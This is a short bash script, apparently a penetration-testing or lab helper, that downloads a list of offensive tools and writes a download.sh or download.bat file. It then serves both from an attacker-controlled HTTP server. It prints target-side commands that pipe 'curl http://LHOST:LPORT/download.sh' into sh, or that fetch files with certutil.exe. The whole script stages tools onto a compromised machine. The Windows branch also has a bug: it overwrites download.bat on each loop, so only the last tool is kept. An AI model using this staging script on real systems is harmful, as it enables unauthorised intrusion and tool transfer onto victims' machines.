#!/bin/bash

if [ $# != 3 ]; then
  echo "Usage: $0 <linux/windows> <LHOST> <LPORT>"
  echo ""
  echo "Example: $0 linux 10.10.12.14 80"
  exit 1
fi

TOOL_URLS=$(cat $1.txt)
LHOST=$2
LPORT=$3

mkdir www
cd www

if [ $1 == "linux" ]; then
    echo "#!/bin/sh" > download.sh
fi

if [ $1 == "windows" ]; then
    echo "@ECHO off" > download.bat
fi

for TOOL_URL in $TOOL_URLS; do
    
    TOOL_NAME=$(echo $TOOL_URL | rev | cut -d'/' -f 1 | rev)

    echo "Downloading '$TOOL_NAME'..."
    if [ ! -f "$TOOL_NAME" ]; then
        wget $TOOL_URL -O $TOOL_NAME -q
    fi

    if [ $1 == "linux" ]; then
        echo "wget http://$LHOST:$LPORT/$TOOL_NAME; chmod +x $TOOL_NAME" >> download.sh
    fi
    if [ $1 == "windows" ]; then
        echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/$TOOL_NAME $TOOL_NAME" > download.bat
    fi

done

if [ $1 == "linux" ]; then
    echo ""
    echo ""
    echo "Use 'curl' piped into 'sh' to download all scripts to your target machine"
    echo ""
    echo "curl http://$LHOST:$LPORT/download.sh | sh"
    echo ""
fi
if [ $1 == "windows" ]; then
    echo ""
    echo ""
    echo "Use 'certutil.exe' to download bash script to your target machine, then run it."
    echo ""
    echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/download.bat download.bat"
    echo ""
fi

if [ $LPORT -lt 1024 ]; then
  echo "Port is less than 1024, you need to provide your sudo password..."
  sudo python3 -m http.server $LPORT
else
  python3 -m http.server $LPORT
fi

